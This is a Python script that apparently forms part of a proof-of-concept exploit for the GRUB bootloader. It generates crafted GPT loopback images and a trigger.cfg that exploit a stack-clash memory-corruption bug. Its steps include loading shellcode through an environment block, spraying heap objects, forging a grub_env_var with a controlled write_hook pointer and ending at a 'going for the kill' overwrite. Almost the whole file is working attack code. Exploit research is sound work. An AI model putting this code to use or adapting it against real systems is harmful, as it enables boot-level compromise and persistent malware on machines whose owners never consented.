from gpt import stack
from consts import BANNER, PROBE_DEPTH, MAX_DEPTH, BLOCK_SIZE, SHELLCODE, \
        TRASH_ALLOC
from util import command, find_root, grub_print, force_regions_to_exist, \
        env_block, VarSplit, RecursiveFuncs, while_loop, grub_env_var, \
        grub_mm_header_t, hashval, Variable


def probe_body(body):
    pre = b'b'*(48)
    post = b'c'*64
    spare = BLOCK_SIZE - (len(pre) + len(post))
    rest = body * (spare // len(body))
    to_add = BLOCK_SIZE - (len(rest) + len(pre) + len(post))
    rest += b'\x00' * to_add
    return pre + rest + post


class Primitive:
    """
    The stack clashing primitive.
    """

    def __init__(self, name, body, max_depth=MAX_DEPTH, debug=False):
        self._max_depth = max_depth
        self._debug = debug
        self._rf = RecursiveFuncs(f'trigger_{name}')
        self._name = name
        self._filename = name
        self._body = probe_body(body)
        assert len(self._body) == BLOCK_SIZE

    def setup(self, basepath):
        # using it twice to give us a second chance with the protective mbr +
        # final gpt volume.
        blocks = stack(self._max_depth, self._body, self._body)
        # padding with one block so we don't trigger the bug automatically with
        # an `ls`
        res = b'b' * BLOCK_SIZE
        res += b''.join(map(bytes, blocks))
        with open(f'{basepath}/{self._filename}', 'wb') as f:
            f.write(res)

    def setup_cfg(self):
        res = []
        # maybe we'll need multiple probe files with different offsets?
        res += command(f'loopback {self._name} /x/{self._filename}')
        res += self._rf.setup()
        res += self._rf.define(
            [
                f'loopback probe ({self._name})$1+',
                'search --file does_not_exist',
                'loopback -d probe'
            ]
        )
        return res

    def destroy(self):
        return [f'loopback -d {self._name}']

    def map_depth(self, depth):
        assert depth <= self._max_depth
        offset = 1 + (self._max_depth - depth) * 3
        return offset

    def trigger(self, depth, fun=0):
        """
        Trigger the bug at a given depth.

        Option to use fun is to avoid having to nudge the target allocations.
        """
        res = []
        if isinstance(depth, str):
            offset = depth
        else:
            offset = self.map_depth(depth)
        if self._debug:
            res += command('set debug=gpt')
        res += self._rf.call(fun, [str(offset)])
        if self._debug:
            res += command('unset debug')

        return res


def clashgpt(basepath):
    # we use these after we corrupt a grub_env_var with the hashval of 0, so we
    # need to make sure they aren't in the same hashtable entry
    assert hashval('depth_') != 0
    assert hashval('fun') != 0
    assert hashval('curr') != 0
    assert hashval('template') != 0
    assert hashval('found') != 0

    # envblocks give a nice way of introducing our shellcode into memory.
    envblock = env_block({'template': SHELLCODE + b'\n'})
    with open(f'{basepath}/e.dat', 'wb') as f:
        f.write(envblock)

    fakeenv = grub_env_var(write_hook=0x30303030)[:8*7]
    teststr = 'Y' * (len(fakeenv) - 1)
    probe_b = grub_mm_header_t(3)
    probe_b += bytes(teststr, 'ascii') + b'\x00'
    probe_b += b'\x00' * (32 - (len(probe_b) % 32))

    control_b = grub_mm_header_t(3)
    control_b += fakeenv
    control_b += b'\x00' * (32 - (len(control_b) % 32))

    print(len(control_b), len(probe_b))
    assert len(control_b) == len(probe_b)

    probe = Primitive('base', probe_b)
    probe.setup(basepath)

    control = Primitive('over', control_b)
    control.setup(basepath)

    vs = VarSplit(TRASH_ALLOC)

    trigger = []
    trigger += grub_print(BANNER)
    trigger += grub_print('[!] setup')
    trigger += find_root('/x/base', 'root')
    # initial setup things
    trigger += command('load_env -f /x/e.dat template')

    # setup our base.
    trigger += probe.setup_cfg()
    trigger += control.setup_cfg()
    trigger += vs.setup()
    trigger += command('set end=NONE')
    trigger += command('set found=false')

    trigger += vs.define('t_0')

    trigger += grub_print('[!] Forcing memory pressure')
    trigger += force_regions_to_exist()
    trigger += grub_print('[!] Setting up construction')
    # setup the construction
    for i in range(64):
        trigger += vs.define(f'uwu_{i}')

    trigger += probe.trigger(PROBE_DEPTH)
    # now determine which one we corrupted.
    for i in range(64):
        trigger += command(
            f'if [ ${{uwu_{i}}} != ${{t_0}} ] ; then set end=uwu_{i}; fi'
        )

    trigger += grub_print('[!] Corrupting: ${end}')
    trigger += command('if [ ${end} = NONE ] ; then normal_exit ; fi')
    trigger += grub_print('[!] Determining Depth')

    # and now we try to get full control over the env vars value and the struct
    # header.
    # so then we can free it and get an object we fully control here.
    # wrapping this in a while loop so we can break from it early.
    internal = []
    for depth in range(PROBE_DEPTH, PROBE_DEPTH+10):
        for fun in range(16):
            internal += command(f'set depth_={probe.map_depth(depth)}')
            internal += command(f'set fun={fun:04}')
            internal += probe.trigger(depth, fun)
            internal += command('eval "set curr=\\$${end}"')
            # internal += command('echo ${curr}')
            internal += command(
                f'if [ "${{curr}}" = {teststr} ]; then set found=true ; break ; fi'
            )
            # see if we have got the probe value we want into the variable.
    internal += ['break']

    trigger += while_loop('1 = 1', internal)
    trigger += command('echo [!] Found: ${depth_} ${fun} ${curr}')

    # from this point on we need to be very careful about variable names, as
    # introducing a fake grub_env_var will make some inaccessible.
    internal = []
    internal += grub_print('[!] going for the kill')
    internal += command('unset ${end}')
    # spray grub_env_vars to get one in our free slot
    for i in range(1024):
        internal += Variable(f'spray_{i}', target=0).set('${template}'*64)
    # now we use our controlled overwrite....
    internal += control.trigger('${depth_}', 'fun')
    # to obtain victory
    internal += command('set =1')
    internal += ['break']

    trigger += while_loop('"${found}" != false', internal)
    trigger += grub_print('done')

    with open(f'{basepath}/trigger.cfg', 'w') as f:
        f.write('\n'.join(trigger))
